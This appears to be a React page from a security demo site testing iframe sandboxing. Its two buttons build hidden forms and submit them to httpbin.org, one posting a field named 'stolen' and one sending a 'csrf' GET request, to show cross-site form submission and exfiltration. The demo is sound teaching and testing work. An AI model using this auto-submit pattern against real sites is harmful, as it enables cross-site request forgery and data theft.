"use client";

import { useRef } from "react";
import { findScenario } from "@/lib/scenarios";
import { ScenarioHeader } from "@/app/ScenarioHeader";
import { EmbedSnippet } from "@/app/EmbedSnippet";
import { Log, useLog } from "@/app/Log";
import { I18N } from "./i18n";
import { usePageI18n } from "../usePageI18n";

const FormAutoSubmitPage = () => {
  const scenario = findScenario("form-auto-submit")!;
  const { lines, push, clear } = useLog();
  const formRef = useRef<HTMLFormElement>(null);
  const t = usePageI18n(I18N);

  const submitToExternal = () => {
    push(t.log.tryPost);
    const form = document.createElement("form");
    form.method = "POST";
    form.action = "https://httpbin.org/post";
    form.target = "_blank";
    const input = document.createElement("input");
    input.name = "stolen";
    input.value = "data-from-iframe";
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
    form.remove();
    push(t.log.postDone);
  };

  const submitGet = () => {
    push(t.log.tryGet);
    push(t.log.getNote);
    const form = document.createElement("form");
    form.method = "GET";
    form.action = "https://httpbin.org/get";
    form.target = "_blank";
    const input = document.createElement("input");
    input.name = "csrf";
    input.value = "fired";
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
    form.remove();
    push(t.log.getDone);
  };

  return (
    <>
      <ScenarioHeader scenario={scenario} />
      <EmbedSnippet slug="form-auto-submit" />

      <h2>{t.actionsHeading}</h2>
      <div className="actions">
        <button className="danger" onClick={submitToExternal}>
          {t.buttons.post}
        </button>
        <button className="danger" onClick={submitGet}>
          {t.buttons.get}
        </button>
        <button onClick={clear}>{t.buttons.clearLog}</button>
      </div>
      <Log lines={lines} />

      <form ref={formRef} style={{ display: "none" }} />

      <h2>{t.explanationHeading}</h2>
      <ul>
        {(t.explanation ?? []).map((html, i) => (
          <li key={i} dangerouslySetInnerHTML={{ __html: html }} />
        ))}
      </ul>
    </>
  );
};

export default FormAutoSubmitPage;
